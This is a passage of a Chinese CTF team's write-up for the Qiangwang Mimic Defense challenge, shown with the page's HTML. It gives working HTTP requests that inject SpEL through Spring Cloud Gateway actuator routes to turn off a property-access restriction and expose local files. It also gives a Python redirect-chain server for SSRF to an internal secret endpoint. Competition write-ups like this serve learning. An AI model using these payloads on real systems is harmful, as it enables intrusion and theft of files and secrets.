<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>第八届“强网”拟态防御国际精英挑战赛 SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次 强网拟态线上预选赛 我们 SU 取得了第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 第八届“强网”拟态防御国际精英挑战赛 的 WriteUp。"><meta property="og:type" content="blog"><meta property="og:title" content="第八届“强网”拟态防御国际精英挑战赛 SU Writeup"><meta property="og:url" content="https://team-su.github.io/posts/29a7c1c3.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次 强网拟态线上预选赛 我们 SU 取得了第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 第八届“强网”拟态防御国际精英挑战赛 的 WriteUp。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/1.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/2.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/3.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/4.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/5.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/6.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/7.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/8.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/9.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/10.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/11.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/12.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/13.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/14.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/15.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/16.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/17.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/18.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/19.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/20.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/21.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/22.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/23.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/24.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/25.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/26.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/27.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/28.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/29.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/30.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/31.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/32.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/33.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/34.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/35.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/36.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/37.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/38.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/39.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/40.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/41.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/42.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/43.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/44.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/45.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/46.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/47.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/48.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/50.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/51.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/52.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/53.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/54.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/54.png"><meta property="og:image" content="https://team-su.github.io/images/2025-QWNT/55.png"><meta property="article:published_time" content="2025-10-27T15:24:08.000Z"><meta property="article:modified_time" content="2025-10-28T01:31:37.139Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="拟态"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2025-QWNT/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/29a7c1c3.html"},"headline":"第八届“强网”拟态防御国际精英挑战赛 SU Writeup","image":["https://team-su.github.io/images/2025-QWNT/1.png","https://team-su.github.io/images/2025-QWNT/2.png","https://team-su.github.io/images/2025-QWNT/3.png","https://team-su.github.io/images/2025-QWNT/4.png","https://team-su.github.io/images/2025-QWNT/5.png","https://team-su.github.io/images/2025-QWNT/6.png","https://team-su.github.io/images/2025-QWNT/7.png","https://team-su.github.io/images/2025-QWNT/8.png","https://team-su.github.io/images/2025-QWNT/9.png","https://team-su.github.io/images/2025-QWNT/10.png","https://team-su.github.io/images/2025-QWNT/11.png","https://team-su.github.io/images/2025-QWNT/12.png","https://team-su.github.io/images/2025-QWNT/13.png","https://team-su.github.io/images/2025-QWNT/14.png","https://team-su.github.io/images/2025-QWNT/15.png","https://team-su.github.io/images/2025-QWNT/16.png","https://team-su.github.io/images/2025-QWNT/17.png","https://team-su.github.io/images/2025-QWNT/18.png","https://team-su.github.io/images/2025-QWNT/19.png","https://team-su.github.io/images/2025-QWNT/20.png","https://team-su.github.io/images/2025-QWNT/21.png","https://team-su.github.io/images/2025-QWNT/22.png","https://team-su.github.io/images/2025-QWNT/23.png","https://team-su.github.io/images/2025-QWNT/24.png","https://team-su.github.io/images/2025-QWNT/25.png","https://team-su.github.io/images/2025-QWNT/26.png","https://team-su.github.io/images/2025-QWNT/27.png","https://team-su.github.io/images/2025-QWNT/28.png","https://team-su.github.io/images/2025-QWNT/29.png","https://team-su.github.io/images/2025-QWNT/30.png","https://team-su.github.io/images/2025-QWNT/31.png","https://team-su.github.io/images/2025-QWNT/32.png","https://team-su.github.io/images/2025-QWNT/33.png","https://team-su.github.io/images/2025-QWNT/34.png","https://team-su.github.io/images/2025-QWNT/35.png","https://team-su.github.io/images/2025-QWNT/36.png","https://team-su.github.io/images/2025-QWNT/37.png","https://team-su.github.io/images/2025-QWNT/38.png","https://team-su.github.io/images/2025-QWNT/39.png","https://team-su.github.io/images/2025-QWNT/40.png","https://team-su.github.io/images/2025-QWNT/41.png","https://team-su.github.io/images/2025-QWNT/42.png","https://team-su.github.io/images/2025-QWNT/43.png","https://team-su.github.io/images/2025-QWNT/44.png","https://team-su.github.io/images/2025-QWNT/45.png","https://team-su.github.io/images/2025-QWNT/46.png","https://team-su.github.io/images/2025-QWNT/47.png","https://team-su.github.io/images/2025-QWNT/48.png","https://team-su.github.io/images/2025-QWNT/50.png","https://team-su.github.io/images/2025-QWNT/51.png","https://team-su.github.io/images/2025-QWNT/52.png","https://team-su.github.io/images/2025-QWNT/53.png","https://team-su.github.io/images/2025-QWNT/54.png","https://team-su.github.io/images/2025-QWNT/54.png","https://team-su.github.io/images/2025-QWNT/55.png"],"datePublished":"2025-10-27T15:24:08.000Z","dateModified":"2025-10-28T01:31:37.139Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次 强网拟态线上预选赛 我们 SU 取得了第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 第八届“强网”拟态防御国际精英挑战赛 的 WriteUp。"}</script><link rel="canonical" href="https://team-su.github.io/posts/29a7c1c3.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2025-10-27T15:24:08.000Z" title="2025/10/27 23:24:08">2025-10-27</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-10-28T01:31:37.139Z" title="2025/10/28 09:31:37">2025-10-28</time></span><span class="level-item">an hour read (About 9073 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">第八届“强网”拟态防御国际精英挑战赛 SU Writeup</h1><div class="content"><p>本次 强网拟态线上预选赛 我们 SU 取得了第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#x65;&#114;&#x73;&#95;&#120;&#99;&#x74;&#x66;&#64;&#x31;&#50;&#54;&#46;&#99;&#x6f;&#109;">suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
<p>以下是我们 SU 第八届“强网”拟态防御国际精英挑战赛 的 WriteUp。</p>
<span id="more"></span>

<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#ezcloud">Ezcloud</a></li>
<li><a href="#safesecret">safesecret</a></li>
<li><a href="#smallcode">smallcode</a></li>
<li><a href="#ecshop">ecshop</a></li>
</ul>
</li>
<li><a href="#reverse">Reverse</a><ul>
<li><a href="#hyperjump">HyperJump</a></li>
<li><a href="#icall">Icall</a></li>
</ul>
</li>
<li><a href="#mobile">Mobile</a><ul>
<li><a href="#ezminiapp">EzMiniApp</a></li>
<li><a href="#just">Just</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#unsafe-parameters">Unsafe Parameters</a></li>
<li><a href="#fms">FMS</a></li>
<li><a href="#blockchain">blockchain</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#ciallo-encrypt">Ciallo_Encrypt</a></li>
</ul>
</li>
<li><a href="#di-kong-jing-ji-wang-luo-an-quan">低空经济网络安全</a><ul>
<li><a href="#the-hidden-link">The Hidden Link</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#stack">stack</a></li>
<li><a href="#pinnote">PinNote</a></li>
<li><a href="#aaaheap">aaaheap</a></li>
<li><a href="#babystack">babystack</a></li>
</ul>
</li>
<li><a href="#che-lian-wang">车联网</a><ul>
<li><a href="#can">Can</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="ezcloud">Ezcloud</span><a href="#ezcloud" class="header-anchor"></a></h2><p>最开始是找到了 <a href="https://blog.csdn.net/guo15890025019/article/details/129503346">https://blog.csdn.net/guo15890025019/article/details/129503346</a></p>
<p>但是复现怎么都不成功，创建路由前面都是对的，然后找有没得Bypass，找到这个</p>
<p><a href="https://rce.moe/2025/09/29/CVE-2025-41243">https://rce.moe/2025/09/29/CVE-2025-41243</a> 正好解决我的问题，直接开干</p>
<p>通过bean map 禁用安全限制，然后刷新路由、添加路由</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/step1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web-632dc679bf.challenge.xctf.org.cn:80</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;step1&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123; @systemProperties[<span class="string">&#x27;spring.cloud.gateway.restrictive-property-accessor.enabled&#x27;</span>] = <span class="string">&#x27;false&#x27;</span> &#125;</span>&quot;</span></span></span><br><span class="line"><span class="language-coffeescript">    &#125;</span></span><br><span class="line"><span class="language-coffeescript">  &#125;],</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;http://example.com&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;predicates&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Path&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;_genkey_0&quot;</span>: <span class="string">&quot;/step1/**&quot;</span></span></span><br><span class="line"><span class="language-coffeescript">    &#125;</span></span><br><span class="line"><span class="language-coffeescript">  &#125;]</span></span><br><span class="line"><span class="language-coffeescript">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web-632dc679bf.challenge.xctf.org.cn:80</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/step1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web-632dc679bf.challenge.xctf.org.cn:80</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;step1&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123; @systemProperties[<span class="string">&#x27;spring.cloud.gateway.restrictive-property-accessor.enabled&#x27;</span>] = <span class="string">&#x27;false&#x27;</span> &#125;</span>&quot;</span></span></span><br><span class="line"><span class="language-coffeescript">    &#125;</span></span><br><span class="line"><span class="language-coffeescript">  &#125;],</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;http://example.com&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;predicates&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Path&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;_genkey_0&quot;</span>: <span class="string">&quot;/step1/**&quot;</span></span></span><br><span class="line"><span class="language-coffeescript">    &#125;</span></span><br><span class="line"><span class="language-coffeescript">  &#125;]</span></span><br><span class="line"><span class="language-coffeescript">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后修改配置</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;step2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Result&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123; @resourceHandlerMapping.urlMap[&#x27;/webjars/**&#x27;].locationValues[0]=&#x27;file:///&#x27; &#125;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Path&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;_genkey_0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/step2/**&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>继续修改</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;step3&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Result&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123; @resourceHandlerMapping.urlMap[&#x27;/webjars/**&#x27;].afterPropertiesSet &#125;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Path&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;_genkey_0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/step3/**&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后访问 &#x2F;webjars&#x2F;flag 就能获得 flag，虽然最后是 404 但是不影响</p>
<p><img src="../images/2025-QWNT/1.png" alt="img"></p>
<h2><span id="safesecret">safesecret</span><a href="#safesecret" class="header-anchor"></a></h2><p>漏洞点在这里的ssti</p>
<p><img src="../images/2025-QWNT/2.png" alt="img"></p>
<p>获取secret, 这里需要ssrf</p>
<p><img src="../images/2025-QWNT/3.png" alt="img"></p>
<p>这一步可以直接ai问出来</p>
<p>exploit_server.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line">CHAIN = &#123;</span><br><span class="line">    <span class="string">&quot;/1&quot;</span>: <span class="string">&quot;/2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/2&quot;</span>: <span class="string">&quot;/3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/3&quot;</span>: <span class="string">&quot;/4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/4&quot;</span>: <span class="string">&quot;/5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/5&quot;</span>: <span class="string">&quot;/6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/6&quot;</span>: <span class="string">&quot;http://127.0.0.1:5000/_internal/secret&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        nxt = CHAIN.get(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> nxt:</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Refresh&quot;</span>, <span class="string">f&quot;0; url=<span class="subst">&#123;nxt&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">        <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;chain step&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HTTPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>), Handler).serve_forever()</span><br></pre></td></tr></table></figure>

<p>请求</p>
